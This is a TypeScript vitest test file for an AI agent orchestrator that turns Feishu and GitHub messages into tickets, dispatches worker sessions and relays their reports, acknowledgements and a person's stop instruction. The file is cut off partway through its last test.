import { Context } from '@deepseek-ai/cordis'
import { bindScopeParent } from '@deepseek-ai/dsh-scope'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { DatabaseSync } from 'node:sqlite'
import { join, delimiter } from 'node:path'
import { afterEach, beforeEach, describe, expect, expectTypeOf, it, vi } from 'vitest'
import type { UserMessage } from '@deepseek-ai/dsh-llm'
import { renderPrompt } from '@deepseek-ai/dsh-system-prompt'
import { Runtime } from '../src/app/runtime.ts'
import { jobRegistry } from './fixtures/host.ts'
import { evalsHealth } from '../src/app/views/overview.ts'
import { mandateInstructions } from '../src/executor/dsh.ts'
import { shellArgv, shimFile } from '../src/infra/environment.ts'
import { masterPrompt } from '../src/app/context.ts'
import { reference, testMachine } from './fixtures/deployment.ts'
import type { Machine } from '../src/deployment.ts'
import { firstSource } from '../src/deployment.ts'
import { SCHEMA_VERSION, Store } from '../src/app/store.ts'
import { TextCache } from '../src/app/cache.ts'
import { KV } from '../src/kv.ts'
import { SettingsSchema, policyVersion, type SettingsOrigin } from '../src/policy.ts'
import { readFileSync, readdirSync, writeFileSync } from 'node:fs'
import { feishuKind } from '../src/sources/feishu.ts'
import type { SourceAdapter } from '../src/sources/kind.ts'
import { githubKind, pollRound } from '../src/sources/github.ts'
import { CliError, Commands } from '../src/infra/commands.ts'
import { UserError, key, runningAssignment, said, threadKey, waitsForPerson, type Trigger } from '../src/core/index.ts'
import { feishuTrigger } from '../src/sources/feishu.ts'
import { feishuChannel } from '../src/sources/feishu-trigger.ts'
import { commentTrigger, githubChannel } from '../src/sources/github-trigger.ts'
import { IM_WORDS } from '../src/infra/text.ts'
import { observePull, pullOf } from '../src/sources/github-pull.ts'
import { credentialHelper, workerGitConfig } from '../src/infra/environment.ts'
import { workerDispatch } from '../src/infra/worker-sources.ts'
import { policyHistory } from '../src/app/settings-history.ts'
import { overview } from '../src/app/views/overview.ts'
import { preview, readable } from '../src/app/views/text.ts'
import { decisionList, search, threadDetail, threadList } from '../src/app/views/threads.ts'
import { executorLoad, ticketDetail, ticketList } from '../src/app/views/tickets.ts'

let runtime: Runtime
const viewsOf = (value: Runtime) => ({ store: value.store, sources: value.sources, links: value.links() })
const overviewOf = (value: Runtime) => overview(viewsOf(value), value.health, policyVersion(value.store.settings()), executorLoad(value.store, value.executor.activeCount()), value.setupProblem ?? value.sourceProblem)
let directory: string
let controller: { create: ReturnType<typeof vi.fn>; selectModel: ReturnType<typeof vi.fn>; resolveAgent: ReturnType<typeof vi.fn>; rename: ReturnType<typeof vi.fn>; prompt: ReturnType<typeof vi.fn>; inspect: ReturnType<typeof vi.fn> }
type RegisteredTool = { name: string; output: { render: (args: unknown, result: unknown) => unknown }; execute: (args: unknown, execution: { signal: AbortSignal }) => Promise<unknown> }
let tools: Map<string, Map<string, RegisteredTool>>
type Section = { name: string; text: (context: { signal?: AbortSignal }) => string; interpolate?: boolean }
let sections: Map<string, Section>
type Guard = (execution?: { name: string; arguments: unknown }) => string | undefined
let guards: Map<string, Guard>
let restricts: Map<string, unknown[]>
type HttpHandler = (req: unknown, res: unknown) => Promise<void>
let http: HttpHandler
async function api(method: string, path: string): Promise<{ status: number; body: unknown }> {
  let status = 0, text = ''
  const req = { method, url: `/orchestrator/api/${path}`, headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' } }
  await http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
  return { status, body: JSON.parse(text) }
}
let agents: Map<string, { id: string; status: string; inbox: { nextTurn: UserMessage[]; nextStep: UserMessage[] }; cancel: ReturnType<typeof vi.fn>; inject: ReturnType<typeof vi.fn> }>
const runTool = async (sessionId: string, name: string, args: unknown) => {
  const tool = tools.get(sessionId)?.get(name)
  if (!tool) throw new Error(`Tool ${name} is not registered for ${sessionId}`)
  const output = await tool.execute(args, { signal: new AbortController().signal })
  expect(JSON.parse(JSON.stringify(output))).toStrictEqual(output)
  await runtime.idle()
  return output as Record<string, unknown>
}
function subscribe(ticketId: string, ref: { source: string; id: string }): void {
  const key = threadKey(ref)
  const thread = runtime.store.threads.get(key) ?? { key, ref, createdAt: '', subscriptions: [], correlated: [], pending: [], meta: {} }
  runtime.store.threads.save({ ...thread, subscriptions: [...new Set([...thread.subscriptions, ticketId])] })
}
async function receive(trigger: Trigger, target = runtime) {
  const result = target.receive(trigger)
  await target.idle()
  return result
}
let services: Record<string, unknown>
/** Runtime 的执行器读取其 worker shell 任务的 DSH 任务注册表。 */
let jobs: ReturnType<typeof jobRegistry>
/** 启动检查的 worker 命令按 argv 打印的内容；Error 会让命令以其消息失败。 */
let answers: Record<string, string | Error>
/** 磁盘上的替代 CLI，因为设置会先找到可执行文件再运行它们：智能体的、合并账户的以及飞书机器人的。 */
const AGENT = () => join(directory, 'agent-gh')
const OTHER = () => join(directory, 'other-gh')
const BOT = () => join(directory, 'lark-bot')
const HELPERS = 'git config -z --show-origin --get-all credential.https://github.com.helper'
const SCOPED = 'git config -z --show-scope --get-regexp ^(credential\\..*|http\\..*extraheader)$'
const subprocess = { spawn: vi.fn((spec: { argv: readonly string[] }) => {
  // 在查找命令响应之前去掉开头的 `env` 和 `KEY=VALUE` 参数。
  const argv = [...spec.argv]
  while (argv[0] === 'env' || /^[A-Z_]+=/.test(argv[0] ?? '')) argv.shift()
  const answer = answers[argv.join(' ')] ?? ''
  const reader = (text: string) => ({ readFrom: () => ({ text, nextOffset: text.length, lossy: false }) })
  return { done: Promise.resolve({ exitCode: answer instanceof Error ? 1 : 0, signal: null }), collected: { stdout: reader(answer instanceof Error ? '' : answer), stderr: reader(answer instanceof Error ? answer.message : '') } }
}) }
/** 测试设置中的来源账户覆盖；`feishu: null` 会禁用飞书来源。 */
interface Accounts { github?: Record<string, unknown>; feishu?: Record<string, unknown> | null }
function seed(store: Store, accounts: Accounts = {}): void {
  const settings = store.settings()
  const { feishu: _feishu, ...others } = settings.sources
  const feishu = accounts.feishu === null ? undefined : { ...settings.sources.feishu?.config, cli: BOT(), ...accounts.feishu }
  store.saveSettings(SettingsSchema.parse({ ...settings, sources: { ...others, github: { kind: 'github', enabled: true, config: { repository: 'acme/widgets', cli: AGENT(), ...accounts.github } }, ...feishu ? { feishu: { kind: 'feishu', enabled: true, config: feishu } } : {} } }))
}
let restarts: ReturnType<typeof vi.fn<() => void>>
async function restart(machine: Partial<Machine> = {}, accounts: Accounts = {}): Promise<Runtime> {
  await runtime.stop()
  const store = new Store(join(directory, 'orchestrator.sqlite')); seed(store, accounts); store.close()
  const ctx = new Context()
  for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service)
  runtime = new Runtime(ctx, testMachine({ stateDir: directory, ...machine }), restarts)
  return runtime
}
let deliveries: ReturnType<typeof vi.fn<(request: { sessionId: string; mode: 'queue' | 'steer'; id: string; text: string }) => void>>
const relays = (sessionId: string) => deliveries.mock.calls.map(([call]) => call).filter(call => call.sessionId === sessionId).map(call => {
  try { return JSON.parse(call.text) as Record<string, unknown> } catch { return { text: call.text } as Record<string, unknown> }
})
const MEMBER = 'ou_alice'
const CHAT = 'oc_team'
function feishu(id: string, text: string, overrides: Record<string, unknown> = {}): Trigger {
  return feishuTrigger('feishu', { message_id: `om_${id}`, chat_id: CHAT, chat_type: 'group', sender_id: MEMBER, sender_type: 'user', content: text, create_time: String(Date.parse('2026-09-09T00:00:00Z') + Number(id.replace(/\D/g, '') || 0) * 1000), mentions: [{ id: 'ou_bot' }], ...overrides }, 'ou_bot', 'cli_bot')!
}
const worktreeName = 'fix-regression'
/** 用主会话的 orchestrator_route 路由一个决定并返回其结果；被拒绝的会抛出原因。 */
async function route(item: Record<string, unknown>): Promise<Record<string, unknown>> {
  const { results } = await runTool(runtime.masterId, 'orchestrator_route', { decisions: [item] }) as { results: Record<string, unknown>[] }
  if (results[0]!.refused) throw new Error(String(results[0]!.refused))
  return results[0]!
}
async function acceptedTicket(trigger = feishu('1', '@bot 修一下回归')) {
  await receive(trigger)
  expect(relays(runtime.masterId).some(item => item.trigger_id === trigger.id)).toBe(true)
  const result = await route({ kind: 'accept', trigger_id: trigger.id, title: '修复回归',
    worktree_name: worktreeName, acknowledgement: '收到，修复回归。' })
  const ticket = runtime.store.tickets.get((result.ticket as { ticket_id: string }).ticket_id)!
  return { trigger, ticket, sessionId: `worker-${ticket.id}` }
}
beforeEach(async () => {
  directory = mkdtempSync(join(tmpdir(), 'orchestrator-runtime-'))
  vi.spyOn(Commands.prototype, 'gh').mockImplementation(async args => args[1] === 'user' ? { login: 'agent-bot' } : args[1]?.includes('/pulls/') ? { state: 'open', user: { login: 'agent-bot' }, html_url: 'https://github.com/acme/widgets/pull/' + args[1].split('/').at(-1), head: { ref: `agent/${String(runtime.store.tickets.list()[0]?.execution?.name)}`, sha: 'head-1', repo: { full_name: 'acme/widgets' } } } : { default_branch: 'master', permissions: { push: true } })
  vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice' }], has_more: false })
  vi.spyOn(Commands.prototype, 'git').mockResolvedValue('')
  vi.spyOn(Commands.prototype, 'run').mockResolvedValue('{"ok":true,"data":{}}')
  restarts = vi.fn()
  answers = {
    [`git -C ${directory} rev-parse --show-toplevel`]: `${directory}\n`,
    [`git -C ${directory} remote get-url --push origin`]: 'https://github.com/acme/widgets.git\n',
    [`${AGENT()} api user`]: '{"login":"agent-bot","id":7}', [`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`]: '{"name":"acme/widgets","push":true}\n',
    [`${OTHER()} api user`]: '{"login":"agent-bot","id":7}', [`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`]: '{"name":"acme/widgets","push":true}\n',
    [`${BOT()} auth status`]: JSON.stringify({ appId: 'cli_bot', brand: 'feishu', identities: { bot: { status: 'ready' } } }),
    [`${BOT()} config strict-mode`]: 'strict-mode: bot (source: profile)',
    [`${BOT()} api GET /open-apis/bot/v3/info --as bot --format ndjson`]: '{"bot":{"open_id":"ou_bot"},"code":0,"msg":"ok"}',
    [HELPERS]: `file:${workerGitConfig(directory)}\0${credentialHelper(directory)}\0`,
    [SCOPED]: `global\0credential.helper\n\0global\0credential.https://github.com.helper\n${credentialHelper(directory)}\0`,
  }
  const ctx = new Context()
  agents = new Map()
  tools = new Map()
  sections = new Map()
  guards = new Map()
  restricts = new Map()
  deliveries = vi.fn()
  controller = {
    create: vi.fn(async ({ sessionId, agentPreset }) => {
      if (agents.has(sessionId)) return
      const agentCtx = new Context()
      const preset = {}
      const inherited = ['bash', 'read', 'read_image', 'skill', 'job_output', 'job_list', 'job_kill', 'grep', 'web_search',
        'ask_user_question', 'plugin_manager', 'schedule_create', 'create_goal', 'session_create', 'session_send_message', 'feishu_doc_edit']
      const sessionTools = new Map<string, RegisteredTool>()
      tools.set(sessionId, sessionTools)
      agentCtx.reflect.provide('tools', { register: (tool: RegisteredTool) => { sessionTools.set(tool.name,
        tool); return () => sessionTools.delete(tool.name) },
        // 预设工具会被继承；subagent 注册在智能体本身上，无法通过 restrict 命名。
        get: (name: string, scope?: object) => {
          const own = scope === agents.get(sessionId)
          return (scope === preset || own) && inherited.includes(name) || own && name === 'subagent' ? { name } : undefined
        },
        restrict: vi.fn((rule: { allow: string[] }) => {
          if (rule.allow.some(name => !inherited.includes(name))) throw new Error('Restriction names a non-inherited tool')
          restricts.set(sessionId, [...restricts.get(sessionId) ?? [], rule]); return () => {}
        }),
        guard: vi.fn((check: Guard) => { guards.set(sessionId, check); return () => {} }) })
      agentCtx.reflect.provide('skills', { register: () => () => {} })
      agentCtx.reflect.provide('systemPrompt', { section: (spec: Section) => { sections.set(sessionId, spec); return () => {} } })
      const inbox = { nextTurn: [] as UserMessage[], nextStep: [] as UserMessage[],
        // 取出一条待处理消息，正如 DSH 的收件箱按其 id 所做的那样。
        remove: (id: string) => [inbox.nextTurn, inbox.nextStep].some(list => {
          const at = list.findIndex(message => message.id === id)
          if (at >= 0) list.splice(at, 1)
          return at >= 0
        }) }
      const modelEvents: { type: string; data: unknown }[] = []
      const deliver = (mode: 'queue' | 'steer') => vi.fn((message: UserMessage) => {
        inbox[mode === 'queue' ? 'nextTurn' : 'nextStep'].push(message)
        deliveries({ sessionId, mode, id: message.id, text: message.content.map(block => block.type === 'text' ? block.text : '').join('') })
        agents.get(sessionId)!.status = 'running'
      })
      agents.set(sessionId, { id: sessionId, ctx: agentCtx, inbox, followup: deliver('queue'), steer: deliver('steer'), status: 'idle', inject: vi.fn(), session: { id: sessionId, header: { agentPreset }, snapshotEvents: () => modelEvents, requestHeader: () => undefined, append: vi.fn((type: string, data: unknown) => { modelEvents.push({ type, data }) }) }, cancel: vi.fn(), whenIdle: async () => {} } as never)
      bindScopeParent(agents.get(sessionId)!, preset)
    }),
    selectModel: vi.fn(async () => {}), resolveAgent: vi.fn(async id => agents.has(id) ? { agent: agents.get(id) } : { error: { code: 'session/not-found' } }), rename: vi.fn(async () => {}),
    prompt: vi.fn(() => { throw new Error('Plugin delivery must not use user RPC') }),
    inspect: vi.fn(async () => ({ events: [] })),
  }
  jobs = jobRegistry()
  services = { agents, llm: { resolveCallConfig: vi.fn(async value => value) }, sessionController: controller, sessionPersistence: { flush: vi.fn(async () => {}), open: vi.fn(async () => ({ read: async () => ({ events: [] }), [Symbol.asyncDispose]: async () => {} })) }, workspaceRegistry: { create: async (cwd: string) => ({ id: cwd }) }, permissionPresets: { set: () => {} }, subprocess, webServer: { host: '127.0.0.1', port: 3082, register: (route: { handler: HttpHandler }) => { http = route.handler; return () => {} } }, jobs: jobs.service }
  for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service)
  for (const cli of [AGENT(), OTHER(), BOT()]) writeFileSync(cli, '#!/bin/sh\n', { mode: 0o755 })
  const store = new Store(join(directory, 'orchestrator.sqlite')); seed(store); store.close()
  runtime = new Runtime(ctx, testMachine({ stateDir: directory }), restarts)
  await runtime.ready
  // 来源类型通常由插件注册，而单元测试中不会加载这些插件。
  runtime.sources.register(feishuKind); runtime.sources.register(githubKind)
  runtime.store.saveSettings({ ...runtime.store.settings(), policy: { ...runtime.store.settings().policy, sources: { feishu: { allowed: [{ id: MEMBER, name: 'Alice' }], syncChat: CHAT }, github: { allowed: [{ id: 'alice' }] } } }, eval: { ...runtime.store.settings().eval, mode: 'auto' }, sources: { github: { kind: 'github', enabled: true, config: { repository: 'acme/widgets', cli: AGENT() } }, feishu: { kind: 'feishu', enabled: true, config: { cli: BOT(), chats: [{ chatId: CHAT, listen: 'all' }], directMessages: true } } } })
  deliveries.mockClear()
})
afterEach(async () => { expect(controller.prompt).not.toHaveBeenCalled(); await runtime?.stop(); vi.restoreAllMocks(); rmSync(directory, { recursive: true, force: true }) })

it('relays an explicit member mention as a candidate and creates the ticket, acknowledgement, subscription and worker on accept', async () => {
  const { trigger, ticket, sessionId } = await acceptedTicket()
  const candidate = relays(runtime.masterId).find(item => item.kind === 'candidate')!
  expect(candidate).toMatchObject({ strength: 'explicit', trigger_id: trigger.id, next_action: 'Route it with orchestrator_route as dispatch says: accept, attach, stop or ignore.' })
  expect(ticket).toMatchObject({ title: '修复回归', mandate: { strength: 'explicit', basis: expect.objectContaining({ via: 'addressed', source: 'feishu', sender: 'Alice', addressed: 'mention', scope: expect.objectContaining({ chatId: CHAT }) }) },
    execution: expect.objectContaining({ name: expect.stringMatching(/^fix-regression-/) }), origin: expect.objectContaining({ triggerId: trigger.id }) })
  expect(ticket).not.toHaveProperty('ended')
  // 工单的执行环境在接受时固定：它在执行根目录下的目录，以及来源值来自其触发器。
  expect(ticket.execution!.directory).toBe(join(directory, 'work', ticket.execution!.name))
  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ DSH_SUPERAGENT_DIR: ticket.execution!.directory, DSH_SUPERAGENT_NAME: ticket.execution!.name, DSH_SUPERAGENT_TICKET: ticket.id, DSH_SUPERAGENT_SOURCE: 'feishu', DSH_SUPERAGENT_FEISHU_CHAT: CHAT })
  expect(ticket.assignments).toEqual([expect.objectContaining({ state: 'running', startedAt: expect.any(String) })])
  expect(sessionId).toBe(`worker-${ticket.id}`)
  expect(runtime.store.threads.get(`feishu:${CHAT}:om_1`)?.subscriptions).toEqual([ticket.id])
  expect(runtime.store.replyStatus(key('ack', trigger.id))).toBe('sent')
  const larkCalls = vi.mocked(Commands.prototype.lark).mock.calls.map(([args]) => args)
  expect(larkCalls.find(args => args[1] === '+messages-reply')).toEqual(expect.arrayContaining(['--message-id', 'om_1', '--markdown', '收到，修复回归。']))
  // 第一条消息承载请求本身：明确工单除它之外没有派工文本，也没有需要先读取的内容。
  const first = relays(sessionId)[0]!
  expect(first).toEqual({ ticket_id: ticket.id, title: '修复回归', trigger: expect.objectContaining({ trigger_id: trigger.id, from: MEMBER,
    thread: `feishu:${CHAT}:om_1`, text: trigger.text }) })
  expect(first.trigger).not.toHaveProperty('read')
  expect(await route({ kind: 'accept', trigger_id: trigger.id, title: 'again', worktree_name: worktreeName, acknowledgement: 'x' })).toMatchObject({ ticket: { ticket_id: ticket.id } })
})

it('fans a person\'s later thread message out to the live worker as context and tells the orchestrator, without an Eval', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  deliveries.mockClear()
  const followup = feishu('2', '顺便看看日志', { mentions: [], root_id: 'om_1', sender_id: 'ou_guest' })
  await receive(followup)
  const worker = relays(sessionId)
  expect(worker).toHaveLength(1)
  expect(worker[0]).toMatchObject({ trigger_id: followup.id, from: 'ou_guest', text: '顺便看看日志' })
  expect(worker[0]).not.toHaveProperty('read')
  // 其资源的渲染相同，来自工单；不存储其正文。
  const resource = `ticket/${ticket.id}/input/${key(runtime.store.tickets.get(ticket.id)!.inputs[0]!.id)}`
  expect(JSON.parse(((await runTool(sessionId, 'orchestrator_read', { resource })) as { text: string }).text)).toEqual(worker[0])
  expect(runtime.store.get(resource)).toBeUndefined()
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([expect.objectContaining({ kind: 'trigger', triggerId: followup.id })])
  expect(relays(runtime.masterId)).toEqual([{ kind: 'follow_up', trigger_id: followup.id, from: 'ou_guest', thread: `feishu:${CHAT}:om_1`,
    at: followup.at, text: '顺便看看日志', delivered_to: [{ ticket_id: ticket.id, title: '修复回归', state: 'working' }],
      note: expect.stringContaining('worker has it and decides') }])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_1`).map(decision => decision.triggerIds)).toEqual([[ticket.origin.triggerId]])
  expect(await runTool(sessionId, 'orchestrator_read', { resource: `trigger/${followup.id}` }))
    .toMatchObject({ trigger_id: followup.id, around: { before: expect.objectContaining({ read: `trigger/${key('feishu', 'om_1')}` }) } })
})

it('assesses a proactive observation in the orchestrator Session and creates the ticket only on a positive auto-mode decision', async () => {
  const observe = (mode: 'observe' | 'auto') => runtime.settings.save('eval', { ...runtime.store.settings().eval, mode }, runtime.store.blockRevision('eval'), 'panel')
  await observe('observe')
  const trigger = feishu('3', '这个文案好奇怪，改成“浏览网页”吧', { mentions: [] })
  await receive(trigger)
  const candidate = relays(runtime.masterId).at(-1)!
  expect(candidate).toMatchObject({ kind: 'candidate', strength: 'inferred', mode: 'observe', next_action: expect.stringContaining('orchestrator_eval') })
  vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ items: [{ message_id: 'om_3', chat_id: CHAT }] })
  const details = await runTool(runtime.masterId, 'orchestrator_eval', { trigger_id: trigger.id })
  // 规则位于主会话的策略部分；上下文会指明构建它时所用的策略版本。
  expect(details).not.toHaveProperty('rules')
  expect(details).toMatchObject({ trigger_id: trigger.id, strength: 'inferred', policy_version: policyVersion(runtime.store.settings()), thread: expect.objectContaining({ complete: true, loaded_messages: 0 }) })
  const decision = (id: string) => ({ trigger_id: id, decision: 'accept', title: '文案修订', worktree_name: 'copy-fix', scope: '改副标题', reason: 'explicit copy change', intent_evidence: 'quoted', acknowledgement: '收到，把副标题改成“浏览网页”。',
    rule_assessments: [{ rule_id: 'copy', matched: true, reason: 'copy change' }, { rule_id: 'visual', matched: false, reason: 'not visual' }],
    direction: { implementation_requested: true, target_basis: 'specified', requires_design_decision: false, evidence: 'the message names the replacement' } })
  expect(await runTool(runtime.masterId, 'orchestrator_eval_decide', decision(trigger.id))).toMatchObject({ decision: 'ignore', reason: expect.stringContaining('Observe mode') })
  expect(runtime.store.tickets.list()).toEqual([])
  expect(runtime.store.decisions.byThread(`feishu:${CHAT}:om_3`)[0]!.audit).toMatchObject({ would_accept: true, proposal: { title: '文案修订' } })
  await observe('auto')
  const again = feishu('5', '把副标题改成“浏览网页”', { mentions: [] })
  await receive(again)
  await runTool(runtime.masterId, 'orchestrator_eval', { trigger_id: again.id })
  const accepted = await runTool(runtime.masterId, 'orchestrator_eval_decide', decision(again.id))
  expect(accepted).toMatchObject({ decision: 'accept', ticket: { ticket_id: expect.any(String) } })
  const ticket = runtime.store.tickets.get((accepted.ticket as { ticket_id: string }).ticket_id)!
  expect(ticket.mandate).toMatchObject({ strength: 'inferred', basis: expect.objectContaining({ via: 'admission', rules: ['copy'], observation: { mode: 'auto' } }) })
  expect(runtime.store.replyStatus(key('ack', again.id))).toBeDefined()
  expect(await runTool(`worker-${ticket.id}`, 'orchestrator_read', { resource: `ticket/${ticket.id}/assignment` })).toMatchObject({ text: expect.stringContaining('Proactively accepted under copy') })
})

it('accepts silently under a rule that says so, gives the worker the rule procedure, and closes it as dropped when nothing is left for a human', async () => {
  const policy = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...policy, rules: [...policy.rules, { id: 'silent-bugfix', name: '沉默地复现和修复', enabled: true, instruction: 'Reproduce minimally first; accept silently.' }] }, runtime.store.blockRevision('policy'), 'panel')
  await runtime.settings.save('eval', { ...runtime.store.settings().eval, mode: 'auto' }, runtime.store.blockRevision('eval'), 'panel')
  const trigger = feishu('20', '切换主题后刷新，图标颜色不对', { mentions: [] })
  await receive(trigger)
  vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ items: [{ message_id: 'om_20', chat_id: CHAT }] })
  await runTool(runtime.masterId, 'orchestrator_eval', { trigger_id: trigger.id })
  const accepted = await runTool(runtime.masterId, 'orchestrator_eval_decide', { trigger_id: trigger.id, decision: 'accept', title: '主题图标颜色', worktree_name: 'theme-icon-color', scope: 'bug', reason: 'reported defect', intent_evidence: 'quoted',
    rule_assessments: [{ rule_id: 'copy', matched: false, reason: 'no' }, { rule_id: 'visual', matched: false, reason: 'no' }, { rule_id: 'silent-bugfix', matched: true, reason: 'bug report' }],
    direction: { implementation_requested: true, target_basis: 'existing-standard', requires_design_decision: false, evidence: 'expected colour is the light palette' } })
  const ticket = runtime.store.tickets.get((accepted.ticket as { ticket_id: string }).ticket_id)!
  expect(runtime.store.replyStatus(key('ack', trigger.id))).toBeUndefined()
  await runtime.idle()
  expect(sections.get(`worker-${ticket.id}`)!.text({})).toContain(mandateInstructions({ strength: 'inferred' }))
  expect(await runTool(`worker-${ticket.id}`, 'orchestrator_read', { resource: `ticket/${ticket.id}/assignment` })).toMatchObject({ text: expect.stringContaining('沉默地复现和修复 (silent-bugfix): Reproduce minimally first; accept silently.') })
  await expect(runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: 'x' })).rejects.toThrow('not ready')
  await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'blocked', summary: 'needs a decision' })
  await expect(runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: 'x' })).rejects.toThrow('not ready')
  // 没有留给人的事：工单会关闭而不是等待，规则的最后一句仍可被投递。
  await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'dropped', summary: 'too complex; recorded in #123' })
  expect(runtime.store.tickets.get(ticket.id)).toMatchObject({ ended: expect.objectContaining({ by: 'executor', outcome: 'dropped' }) })
  expect(await runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: '看到这个问题我试了一下，能复现，修复需要较大改动，已记在 #123。' })).toEqual({ status: 'sent' })
})

it('records worker reports, binds the task PR, ends the ticket on ready without a PR, and relays attention', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  deliveries.mockClear()
  expect(await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'started' })).toMatchObject({ notification: 'internal_only' })
  expect(relays(runtime.masterId)).toEqual([])
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'need a decision', human_action: 'Desktop too?' })
  expect(runtime.store.tickets.get(ticket.id)!.attention).toMatchObject({ question: 'Desktop too?' })
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_attention', ticket: { ticket_id: ticket.id, attention: { question: 'Desktop too?' } } })
  await expect(runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'other', text: 'x' })).rejects.toThrow('current attention question')
  expect(await runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'Desktop too?', text: '要不要也改桌面端？' })).toEqual({ status: 'sent' })
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 42, human_action: null })
  const bound = runtime.store.tickets.get(ticket.id)!
  expect(pullOf(bound)).toBe(42)
  expect(bound.attention).toBeUndefined()
  expect(runtime.store.threads.get('github:42')?.subscriptions).toEqual([ticket.id])
  await runTool(sessionId, 'orchestrator_report', { state: 'ready', summary: 'reviewed' })
  expect(runtime.store.tickets.get(ticket.id)!.ended).toBeUndefined()
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_report', state: 'ready' })
  expect(await runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: '已提交 PR #42，待 review。' })).toEqual({ status: 'sent' })
  const mergedAt = new Date().toISOString()
  const merged = { number: 42, state: 'closed', merged: true, merged_at: mergedAt, html_url: 'https://github.com/acme/widgets/pull/42',
    user: { login: 'agent-bot' }, head: { sha: 'abc', ref: 'agent/x', repo: { full_name: 'acme/widgets' } } }
  await observePull(runtime.context(githubKind, 'github'), merged)
  const ended = runtime.store.tickets.get(ticket.id)!
  expect(ended).toMatchObject({ ended: expect.objectContaining({ by: 'executor', outcome: 'merged' }) })
  // 已结束的工单保留其对 PR 的订阅，因此之后那里的人类评论会恢复它。
  expect(runtime.store.threads.get('github:42')?.subscriptions).toEqual([ticket.id])
  // 其 worker 的最后话语是就绪报告，因此其回合不会被取消：由它自己结束。
  expect(agents.get(sessionId)!.cancel).not.toHaveBeenCalled()
  const notice = runtime.store.receipts.waiting().find(item => item.kind === 'notice')
  expect(notice ?? runtime.store.replyStatus(key('pr-terminal', '42', 'feishu', JSON.stringify({ chatId: CHAT, messageId: 'om_1' }), 'merged'))).toBeTruthy()
})

it('lists each ticket with the Threads it subscribes to, as their Sources describe them', async () => {
  const { sessionId, ticket } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 42 })
  const line = () => ticketList(viewsOf(runtime), 'working', 0, 20).items.find(item => item.id === ticket.id)!
  runtime.store.threads.describe('github:42', { label: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } })
  expect(line()).not.toHaveProperty('prNumber')
  expect(line().threads).toContainEqual(expect.objectContaining({ key: 'github:42', source: 'github', title: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } }))
  runtime.store.threads.describe('github:42', { facts: { ci: null } })
  expect(line().threads.find(thread => thread.key === 'github:42')!.facts).toEqual({ number: { value: '#42' } })
})

it('shows a message that carries JSON, with or without a label, as its label and values on lines', () => {
  const text = `GitHub PR #7 CI: ${JSON.stringify({ head: 'abc1234', checks: [{ name: 'e2e', status: 'completed', conclusion: 'failure' }, { name: 'lint', status: 'in_progress', conclusion: null }], statuses: [] })}`
  expect(readable(text)).toBe('GitHub PR #7 CI\nhead: abc1234\nchecks:\n- e2e · completed · failure\n- lint · in_progress\nstatuses: ')
  expect(preview(text)).toBe('GitHub PR #7 CI head: abc1234 checks: e2e · completed · failure lint · in_progress statuses:')
  expect(readable('see {this} later')).toBe('see {this} later')
  expect(readable('label: {not json}')).toBe('label: {not json}')
})

it('ends a ticket on ready when no PR is bound', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'ready', summary: 'done locally' })
  expect(runtime.store.tickets.get(ticket.id)).toMatchObject({ ended: expect.objectContaining({ outcome: 'completed' }) })
  await expect(runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'late' })).rejects.toThrow('Ticket ended')
})

it('stops a ticket on a person\'s instruction for good, and resumes an ended one on any person\'s message on its thread', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const request = feishu('5', '@bot 停下，不用修了', { root_id: 'om_1' })
  await receive(request)
  expect(await route({ kind: 'stop', ticket_id: ticket.id, trigger_id: request.id }))
    .toMatchObject({ decision: 'stop', reason: 'Human asked to stop', ticket: { ticket_id: ticket.id, state: 'stopped' } })
  // 结束说明这是人的一次停止：没有重复结果的 reason，也没有复制到派工上。
  const stopped = runtime.store.tickets.get(ticket.id)!
  expect(stopped.ended).toEqual({ at: expect.any(String), by: 'human', outcome: 'stopped' })
  expect(stopped.assignments[0]).not.toHaveProperty('endedReason')
  expect(agents.get(sessionId)!.cancel).toHaveBeenCalledWith({ kind: 'user' }, { keepInbox: false })
  // 停止会撤回授权：之后的消息作为上下文等待，只有新的工作才会重启它。
  const guest = feishu('6', '继续吧', { mentions: [], root_id: 'om_1', sender_id: 'ou_guest' })
  await receive(guest)
  await runtime.pump()
